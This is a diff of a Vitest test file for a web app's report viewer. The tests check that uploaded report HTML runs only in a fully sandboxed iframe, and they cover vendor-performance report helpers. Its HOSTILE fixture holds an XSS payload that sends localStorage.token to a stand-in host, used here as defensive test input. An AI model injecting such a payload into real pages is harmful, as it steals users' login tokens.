@@ -1,12 +1,22 @@
 import { readFileSync } from "node:fs";
-import { describe, expect, it } from "vitest";
+import { createElement } from "react";
+import { renderToStaticMarkup } from "react-dom/server";
+import { afterEach, describe, expect, it, vi } from "vitest";
 import { LINE_META, METRICS_WITHOUT_A_LINE, caughtBy, unattributed } from "./lineMap";
+import { REPORT_SANDBOX, ReportFrame, openReportTab, type TabOpener } from "./reportFrame";
 import type {
   MrAskAnswer, MrAskFact, MrBoardCoverageColumn, MrBoardRow, MrReportKind, MrReportPeriods,
 } from "@/lib/api";
+// Values from the API client come in by relative path: the suite runs without
+// the `@/` alias, which only the erased type imports above can use.
+import {
+  ApiError, MR_VENDOR_OFF, isCampaignKind, isVendorKind, mrBoardReportHtml, mrVendorReportHtml,
+  mrVendorReportPeriods, readVendorPeriods,
+} from "../../../../lib/api";
 import {
   REPORT_META, REPORT_PERIOD_LIST, absentMetrics, boardPeriodOptions, boardPeriodValues,
-  filledOf, periodsFor, takesPeriod,
+  filledOf, missingFigures, periodsFor, takesPeriod, vendorBuiltLine, vendorMonthPick,
+  visibleRuns,
 } from "../../../console/mr/reportMeta";
 import {
   askCaveat, askPeriodLabel, askProvenance, citedFacts, citeTitle, citeTokens, isOfflineSummary,
@@ -907,5 +917,346 @@ describe("the Ask panel's own words", () => {
     // tracker and another sheet only when it was included in the dashboard.
     expect(sourceOf("./Ask.tsx")).not.toContain("cannot disagree with the desk");
     expect(sourceOf("./Ask.tsx")).toContain("only if it was included in the dashboard");
+  });
+});
+
+/* --------------------------------------------------------------------------
+   Report HTML never runs in the app's origin.
+
+   The login token lives in localStorage on this origin, and from Phase 2 any
+   team member can upload a report template. So every report document is shown
+   as the srcdoc of an iframe whose sandbox grants nothing — inline and in a new
+   tab — and no report HTML ever becomes a blob: or data: URL a tab navigates to.
+   -------------------------------------------------------------------------- */
+
+const HOSTILE = `<p onclick="steal()">"Q3" & co</p><script>fetch("//x?t="+localStorage.token)</script>`;
+
+/** A blank tab, as much of one as `openReportTab` touches, logging the order
+ *  things happen in — the sandbox must be on the frame before its document. */
+function fakeTabs() {
+  const log: string[] = [];
+  type El = {
+    tag: string; attrs: Record<string, string>; textContent: string; children: El[];
+    parent: El | null; setAttribute(k: string, v: string): void; appendChild(c: El): El;
+    remove(): void;
+  };
+  const el = (tag: string): El => {
+    const node: El = {
+      tag, attrs: {}, textContent: "", children: [], parent: null,
+      setAttribute(k, v) { log.push(`set ${tag}.${k}`); node.attrs[k] = v; },
+      appendChild(c) { log.push(`mount ${c.tag}`); c.parent = node; node.children.push(c); return c; },
+      remove() { if (node.parent) node.parent.children = node.parent.children.filter((x) => x !== node); },
+    };
+    return node;
+  };
+  const doc = { title: "", head: el("head"), body: el("body"), createElement: el };
+  const tab = { opener: {} as unknown, document: doc, closed: false, close() { tab.closed = true; } };
+  const open = vi.fn((..._args: unknown[]) => tab);
+  return { opener: { open } as unknown as TabOpener, open, tab, doc, log };
+}
+
+const frameIn = (doc: ReturnType<typeof fakeTabs>["doc"]) =>
+  doc.body.children.find((c) => c.tag === "iframe");
+
+describe("the report viewer is a sandboxed iframe", () => {
+  it("grants the report nothing — no scripts, no same-origin", () => {
+    expect(REPORT_SANDBOX).toBe("");
+    expect(REPORT_SANDBOX).not.toMatch(/allow-scripts|allow-same-origin/);
+  });
+
+  it("renders the inline viewer with the sandbox attribute and the report as srcdoc, escaped", () => {
+    const html = renderToStaticMarkup(createElement(ReportFrame, { html: HOSTILE, title: "Vendor Performance" }));
+    expect(html).toMatch(/^<iframe\b/);
+    expect(html).toMatch(/\ssandbox=""/);
+    expect(html).not.toMatch(/allow-/);
+    // HTML attribute names are case-insensitive; React writes this one `srcDoc`.
+    expect(html).toMatch(/\ssrcdoc="[^"]*&lt;script&gt;/i);
+    expect(html).not.toContain("<script");
+    expect(html).toContain('title="Vendor Performance"');
+  });
+
+  it("opens the new tab blank, then mounts the report in the same sandbox — sandbox first", () => {
+    const { opener, open, tab, doc, log } = fakeTabs();
+    const handle = openReportTab("Vendor Performance — September 2026", opener);
+    expect(handle).not.toBeNull();
+    expect(open).toHaveBeenCalledWith("", "_blank");
+    expect(tab.opener).toBeNull();
+    expect(doc.title).toBe("Vendor Performance — September 2026");
+    expect(frameIn(doc)).toBeUndefined();
+
+    handle!.show(HOSTILE);
+    const frame = frameIn(doc)!;
+    expect(frame.attrs.sandbox).toBe("");
+    expect(frame.attrs.srcdoc).toBe(HOSTILE);
+    expect(Object.values(frame.attrs).join(" ")).not.toMatch(/allow-/);
+    // The sandbox is read when the frame first navigates: set before its document,
+    // and both before it is mounted.
+    expect(log.indexOf("set iframe.sandbox")).toBeLessThan(log.indexOf("set iframe.srcdoc"));
+    expect(log.indexOf("set iframe.srcdoc")).toBeLessThan(log.indexOf("mount iframe"));
+    // Nothing of the report is anywhere else in the tab, which shares this origin.
+    expect(doc.head.children.map((c) => c.textContent).join("")).not.toContain("script");
+    expect(doc.body.children).toHaveLength(1);
+  });
+
+  it("says so when the browser blocks the tab, rather than opening anything else", () => {
+    const open = vi.fn(() => null);
+    expect(openReportTab("x", { open } as unknown as TabOpener)).toBeNull();
+    expect(open).toHaveBeenCalledTimes(1);
+  });
+
+  it("closes the tab it opened when the report cannot be fetched", () => {
+    const { opener, tab } = fakeTabs();
+    openReportTab("x", opener)!.close();
+    expect(tab.closed).toBe(true);
+  });
+});
+
+describe("no blob URL of report HTML is ever opened", () => {
+  afterEach(() => { vi.restoreAllMocks(); vi.unstubAllGlobals(); });
+
+  it("fetches both report documents as text, never as an object URL", async () => {
+    const objectUrl = vi.spyOn(URL, "createObjectURL");
+    const fetchMock = vi.fn(async (_url: string) =>
+      new Response(HOSTILE, { status: 200, headers: { "Content-Type": "text/html; charset=utf-8" } }));
+    vi.stubGlobal("fetch", fetchMock);
+
+    expect(await mrVendorReportHtml("v1")).toBe(HOSTILE);
+    expect(await mrBoardReportHtml("b1")).toBe(HOSTILE);
+    expect(fetchMock.mock.calls.map((c) => String(c[0])))
+      .toEqual([expect.stringMatching(/\/api\/mr\/vendor-report\/v1\/html$/),
+                expect.stringMatching(/\/api\/mr\/board-report\/b1\/html$/)]);
+    expect(objectUrl).not.toHaveBeenCalled();
+  });
+
+  it("opens a tab only ever on the blank page, never on a blob: or data: URL", () => {
+    const objectUrl = vi.spyOn(URL, "createObjectURL");
+    const { opener, open } = fakeTabs();
+    openReportTab("Board Report", opener)!.show(HOSTILE);
+    for (const call of open.mock.calls) expect(String(call[0])).not.toMatch(/^(blob|data):/);
+    expect(open.mock.calls).toEqual([["", "_blank"]]);
+    expect(objectUrl).not.toHaveBeenCalled();
+  });
+
+  it("leaves no HTML-as-object-URL helper in the API client", () => {
+    const api = sourceOf("../../../../lib/api.ts");
+    expect(api).not.toMatch(/blobUrl\(\s*`[^`]*\/html`/);
+    expect(api).not.toContain("mrBoardReportHtmlUrl");
+  });
+
+  it("routes every report document in the Reports panel through the sandboxed viewer", () => {
+    const reports = sourceOf("./Reports.tsx");
+    expect(reports).not.toContain("HtmlUrl");
+    expect(reports).not.toContain("createObjectURL");
+    expect(reports).not.toMatch(/<iframe\b|srcDoc|dangerouslySetInnerHTML/);
+    // The one window.open left is the campaign report's PDF — a PDF, not HTML.
+    expect(reports.match(/window\.open\(/g)).toHaveLength(1);
+    expect(reports).toMatch(/const url = await mrReportPdfUrl\(id\);\s*window\.open\(url/);
+    // Both report kinds that have HTML open through the one shared button…
+    expect(reports).toMatch(/read=\{\(\) => mrBoardReportHtml\(report\.id\)\}/);
+    expect(reports).toContain("<ReportFrame key={run.id} html={html.data}");
+    // …which opens the tab before it awaits anything, so it is not a blocked popup.
+    expect(reports).toMatch(/const tab = openReportTab\(title\);[\s\S]{0,400}tab\.show\(await read\(\)\)/);
+  });
+});
+
+/* --------------------------------------------------------------------------
+   Vendor Performance: what the band reads, and what it says.
+   -------------------------------------------------------------------------- */
+
+describe("the vendor periods reply", () => {
+  afterEach(() => { vi.unstubAllGlobals(); });
+
+  const answer = (status: number, body: unknown) =>
+    vi.stubGlobal("fetch", vi.fn(async () =>
+      new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } })));
+
+  it("reads a backend that predates the route as switched off — no band, not an error", async () => {
+    answer(404, { detail: "Not Found" });
+    expect(await mrVendorReportPeriods()).toEqual(MR_VENDOR_OFF);
+    expect(MR_VENDOR_OFF.enabled).toBe(false);
+  });
+
+  it("passes any other failure through, so 'we never found out' is not 'off'", async () => {
+    answer(500, { detail: "boom" });
+    await expect(mrVendorReportPeriods()).rejects.toBeInstanceOf(ApiError);
+  });
+
+  it("reads the live shape as sent", async () => {
+    answer(200, {
+      enabled: true, pdf_available: false,
+      pdf_unavailable_reason: "PDF export isn't set up on this server yet (RENDERER_URL is unset).",
+      months: [{ year_month: "2026-09", label: "September 2026" }, { year_month: "2026-08", label: "August 2026" }],
+    });
+    const p = await mrVendorReportPeriods();
+    expect(p.enabled).toBe(true);
+    expect(p.pdf_available).toBe(false);
+    expect(p.months.map((m) => m.year_month)).toEqual(["2026-09", "2026-08"]);
+  });
+
+  it("defaults every field a skewed backend leaves out: off, PDF asked of the server, no months", () => {
+    expect(readVendorPeriods({})).toEqual({
+      enabled: false, pdf_available: true, pdf_unavailable_reason: null, months: [],
+    });
+    expect(readVendorPeriods(null).enabled).toBe(false);
+    expect(readVendorPeriods({ enabled: "yes" }).enabled).toBe(false);
+  });
+
+  it("drops a month with no year_month and labels one with no label by its key", () => {
+    expect(readVendorPeriods({
+      enabled: true, months: [{ label: "Lost" }, null, { year_month: "2026-07" }],
+    }).months).toEqual([{ year_month: "2026-07", label: "2026-07" }]);
+  });
+});
+
+describe("vendor runs on the rail", () => {
+  const runs = [
+    { id: "v", kind: "vendor_report" as const },
+    { id: "b", kind: "board_report" as const },
+    { id: "d", kind: "daily_summary" as const },
+  ];
+
+  it("hides vendor rows from Already written while the feature is off or unknown", () => {
+    expect(visibleRuns(runs, false).map((r) => r.id)).toEqual(["b", "d"]);
+    expect(visibleRuns(runs, true).map((r) => r.id)).toEqual(["v", "b", "d"]);
+  });
+
+  it("labels the vendor kind and keeps it out of the ten", () => {
+    expect(REPORT_META.vendor_report.label).toBe("Vendor Performance");
+    expect(isVendorKind("vendor_report")).toBe(true);
+    expect(isCampaignKind("vendor_report")).toBe(false);
+    expect(isCampaignKind("board_report")).toBe(false);
+    expect(isCampaignKind("daily_summary")).toBe(true);
+    expect(REPORT_PERIOD_LIST).not.toHaveProperty("vendor_report");
+  });
+});
+
+describe("vendorMonthPick", () => {
+  const months = [{ year_month: "2026-09", label: "September 2026" }, { year_month: "2026-08", label: "August 2026" }];
+
+  it("preselects the newest month", () => expect(vendorMonthPick(months, "")).toBe("2026-09"));
+  it("keeps a pick that is still on offer", () => expect(vendorMonthPick(months, "2026-08")).toBe("2026-08"));
+  it("falls back to the newest when a re-read drops the pick", () =>
+    expect(vendorMonthPick(months, "2026-05")).toBe("2026-09"));
+  it("is empty with nothing to pick", () => expect(vendorMonthPick([], "2026-09")).toBe(""));
+});
+
+describe("vendorBuiltLine", () => {
+  // Built from local time, so the line reads the same in every timezone.
+  const at = (h: number, m: number, y = 2026, mo = 9, d = 2) => new Date(y, mo, d, h, m).toISOString();
+
+  it("reads as the spec writes it", () => {
+    expect(vendorBuiltLine({
+      built_at: at(9, 14), generated_at: at(9, 14), sweep_date: "2026-10-02",
+      template: { kind: "builtin" },
+    })).toBe("Built 2 Oct 2026, 9:14 am, from the workbook pulled on 2 Oct. Template: built-in.");
+  });
+
+  it("names a saved version by its number", () => {
+    expect(vendorBuiltLine({
+      generated_at: at(21, 5), sweep_date: "2026-10-02", template: { kind: "uploaded", version: 4 },
+    })).toBe("Built 2 Oct 2026, 9:05 pm, from the workbook pulled on 2 Oct. Template: version 4.");
+  });
+
+  it("writes midnight as 12, and gives the pull's year when it differs", () => {
+    expect(vendorBuiltLine({ generated_at: at(0, 30, 2026, 0, 1), sweep_date: "2025-12-31" }))
+      .toBe("Built 1 Jan 2026, 12:30 am, from the workbook pulled on 31 Dec 2025.");
+  });
+
+  it("says nothing it was not told", () => {
+    expect(vendorBuiltLine({ generated_at: "not a date" })).toBe("Built, from the last workbook pull.");
+  });
+});
+
+describe("missingFigures", () => {
+  const eleven = Array.from({ length: 11 }, (_, i) => `Vendor ${i + 1}`);
+
+  it("counts dashes on the page and gives each one's reason as a sentence", () => {
+    const read = missingFigures([
+      { metric: "show_rate_pct", label: "Show rate", vendors: eleven, reason: "no demos booked yet" },
+      { metric: "cost_per_lead", label: "Cost per lead", vendors: "portfolio",
+        reason: "a component total is withheld (see above)" },
+      { metric: "reconciliation", label: "Roll-up reconciliation", vendors: "portfolio",
+        reason: "The roll-up tab wasn't captured in this pull, so vendor totals aren't compared." },
+      { metric: "spend", label: "Spend", vendors: ["Avvo"], reason: "not reported on the vendor tab" },
+    ]);
+    expect(read?.count).toBe(14);
+    expect(read?.rows).toEqual([
+      "Show rate, 11 vendors: no demos booked yet.",
+      "Cost per lead, the portfolio total: a component total is withheld (see above).",
+      "Roll-up reconciliation, the portfolio total: the roll-up tab wasn't captured in this pull, so vendor totals aren't compared.",
+      "Spend, Avvo: not reported on the vendor tab.",
+    ]);
+  });
+
+  it("never lower-cases an acronym", () => {
+    expect(missingFigures([{ label: "CAC", vendors: "portfolio", reason: "CPL is undefined" }])?.rows)
+      .toEqual(["CAC, the portfolio total: CPL is undefined."]);
+  });
+
+  it("keeps 'the run did not say' apart from 'nothing is missing'", () => {
+    expect(missingFigures(undefined)).toBeNull();
+    expect(missingFigures([])).toEqual({ count: 0, rows: [] });
+  });
+});
+
+describe("the Vendor Performance band's own words", () => {
+  const reports = () => sourceOf("./Reports.tsx");
+
+  it("draws the band only when the server says it is on, or when we never found out", () => {
+    expect(reports()).toContain("const vendorOn = vendor.data?.enabled === true;");
+    expect(reports()).toMatch(/\{vendorBand && \(\s*<VendorBuild/);
+    expect(reports()).toContain("visibleRuns(runs.data || [], vendorOn)");
+  });
+
+  it("sits above the board report", () => {
+    expect(reports().indexOf("<VendorBuild")).toBeLessThan(reports().indexOf("<BoardBuild"));
+  });
+
+  it("carries the spec's copy for every state", () => {
+    for (const line of [
+      'what="Reading which months have vendor figures"',
+      "No month has vendor figures yet",
+      "It's built from the vendor tabs. Pull the workbook and months appear here.",
+      "Build the report",
+      '"Building…"',
+      "The team's reports use the built-in template.",
+      "is built and filed under Already written.",
+      "Pull the workbook, then build again.",
+      "Open in a new tab",
+      "Download the PDF",
+      '"Preparing the PDF…"',
+      "Which figures, and why",
+    ]) expect(reports(), line).toContain(line);
+  });
+
+  it("does not promise a PDF the browser cannot print", () => {
+    // A browser prints an iframe only as far as its visible box, so "print it to
+    // PDF from your browser" would hand over a cut-off report. The renderer is
+    // the fix; until then the line points at what does work.
+    expect(reports()).toContain(
+      "PDF downloads aren't set up on this server yet. The full report is here, or open it in a new tab to read it full-screen.");
+    expect(reports()).not.toMatch(/print it to PDF|from your browser/i);
+  });
+
+  it("states the missing-figure count without a cause that is not true of every row", () => {
+    // "no target set" and the roll-up reconciliation are not the vendor tabs'
+    // doing, so the line gives no cause; each row's own reason is in the disclosure.
+    expect(reports()).toMatch(
+      /\{n\(gaps\.count\)\} \{gaps\.count === 1 \? "figure shows" : "figures show"\}<\/b>\s*\{" as — \. A dash means missing, not zero\."\}/);
+    expect(reports()).not.toContain("vendor tabs don't have");
+  });
+
+  it("offers the pull in the empty states", () => {
+    expect(reports()).toMatch(/No month has vendor figures yet" action=\{<PullWorkbook/);
+    expect(reports()).toMatch(/\{empty && \([\s\S]{0,120}<PullWorkbook pull=\{pull\} \/>/);
+  });
+
+  it("has no Change template control yet — Phase 2 brings it with its API", () => {
+    expect(reports()).not.toContain("Change template");
+  });
+
+  it("describes the ten in the reader's terms, not the developer's", () => {
+    expect(reports()).toContain('note="What each one contains."');
+    expect(reports()).not.toContain("In the app being replaced this sits in a title attribute");
   });
 });
